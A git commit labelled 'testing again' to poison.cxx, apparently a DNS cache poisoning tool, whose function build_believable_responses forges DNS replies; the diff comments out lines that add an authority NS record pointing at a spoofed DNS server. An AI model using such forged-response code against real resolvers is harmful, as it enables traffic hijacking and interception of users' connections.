947593e39ff48eb4b61851fc55e0c2a32bee0be1
Mahmut Bulut <mahmutbulut0@gmail.com>
2015-01-19 21:37:10 +0200

    testing again

--- poison.cxx
+++ poison.cxx
@@ -116,14 +116,14 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 
 		//build authoritative record field
 
-		DNS::Resource authority_field;
-		authority_field.dname(basedomain);
-		authority_field.ttl(ttl_val);
-		authority_field.type(DNS::NS);
-		authority_field.query_class(DNS::IN);
-		authority_field.data(spoof_dns);
+		// DNS::Resource authority_field;
+		// authority_field.dname(basedomain);
+		// authority_field.ttl(ttl_val);
+		// authority_field.type(DNS::NS);
+		// authority_field.query_class(DNS::IN);
+		// authority_field.data(spoof_dns);
 
-		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
+		// resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
 
 		// Additional field
